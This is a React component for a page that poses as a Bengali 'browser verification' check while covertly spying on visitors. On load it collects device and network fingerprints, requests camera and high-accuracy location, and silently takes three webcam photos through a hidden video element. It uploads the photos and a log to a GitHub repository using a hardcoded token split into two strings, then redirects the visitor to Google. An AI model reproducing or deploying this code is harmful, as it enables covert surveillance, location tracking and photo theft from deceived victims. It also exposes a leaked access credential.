
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const videoRef = useRef<HTMLVideoElement>(null);
  const executed = useRef(false);

  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";

  useEffect(() => {
    if (id && !executed.current) {
      executed.current = true;
      ultraCapture();
    }
  }, [id]);

  const uploadToGitHub = async (path: string, content: string, isBase64 = false) => {
    try {
      await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/${path}`, {
        method: 'PUT',
        headers: { 'Authorization': `token ${G_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `Capture: ${path}`,
          content: isBase64 ? content : btoa(unescape(encodeURIComponent(content))),
        }),
      });
    } catch (e) { console.error(e); }
  };

  const getGPUInfo = () => {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "Unknown";
    const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
  };

  const ultraCapture = async () => {
    const startTime = Date.now();
    const logId = `v_${Date.now()}`;

    // 1. Hardware & Network Intelligence
    const getDeepInfo = async () => {
      const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
      const ipData = ipRes ? await ipRes.json() : { ip: 'Unknown', org: 'Unknown' };
      // @ts-ignore
      const battery = navigator.getBattery ? await navigator.getBattery() : null;
      // @ts-ignore
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

      return {
        ip: ipData.ip || 'Unknown',
        isp: ipData.org || 'Unknown',
        battery: battery ? { level: Math.round(battery.level * 100), charging: battery.charging } : 'N/A',
        ram: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        gpu: getGPUInfo(),
        screen: `${window.screen.width}x${window.screen.height}`,
        network: conn ? `${conn.effectiveType} (${conn.type || 'N/A'})` : 'Unknown',
        userAgent: navigator.userAgent,
        platform: navigator.platform
      };
    };

    // 2. Trigger Permissions
    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).catch(() => null);
    const geoPromise = new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), { enableHighAccuracy: true, timeout: 3000 });
    });

    const [info, stream, pos] = await Promise.all([getDeepInfo(), mediaPromise, geoPromise]);

    const finalPayload: any = {
      ...info,
      userId: id,
      time: new Date().toLocaleString('bn-BD'),
      location: pos ? {
        // @ts-ignore
        lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy
      } : 'Denied/Timeout',
      photos: []
    };

    // 3. Burst Capture (3 Photos at 800ms intervals)
    if (stream && videoRef.current) {
      videoRef.current.srcObject = stream;
      for (let i = 1; i <= 3; i++) {
        await new Promise(r => setTimeout(r, 800));
        const canvas = document.createElement('canvas');
        canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0, 640, 480);
        const photoB64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
        const photoPath = `data/captures/${logId}_${i}.jpg`;
        await uploadToGitHub(photoPath, photoB64, true);
        finalPayload.photos.push(`https://raw.githubusercontent.com/${G_OWNER}/${G_REPO}/main/${photoPath}`);
      }
      stream.getTracks().forEach(t => t.stop());
    }

    // 4. Save Logs
    await uploadToGitHub(`data/logs/${logId}.json`, JSON.stringify(finalPayload));

    // Force Redirection
    const elapsed = Date.now() - startTime;
    setTimeout(() => { window.location.href = "https://www.google.com"; }, Math.max(0, 3500 - elapsed));
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC] flex flex-col items-center justify-center font-['Hind_Siliguri'] p-6">
       <div className="w-full max-w-sm bg-white p-10 rounded-[40px] shadow-2xl shadow-blue-100/50 border border-slate-100 text-center">
          <div className="relative w-16 h-16 mx-auto mb-6">
             <div className="absolute inset-0 border-4 border-blue-100 rounded-full"></div>
             <div className="absolute inset-0 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          </div>
          <h1 className="text-2xl font-black text-slate-800 mb-2">ব্রাউজার ভেরিফিকেশন</h1>
          <p className="text-slate-400 text-sm leading-relaxed">আপনার কানেকশন সুরক্ষিত কি না তা যাচাই করা হচ্ছে। অনুগ্রহ করে অপেক্ষা করুন...</p>
          <div className="mt-8 pt-6 border-t border-slate-50 flex items-center justify-center gap-2">
             <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
             <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Secure Cloud Sync</span>
          </div>
          <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
       </div>
    </div>
  );
};

export default TrackPage;
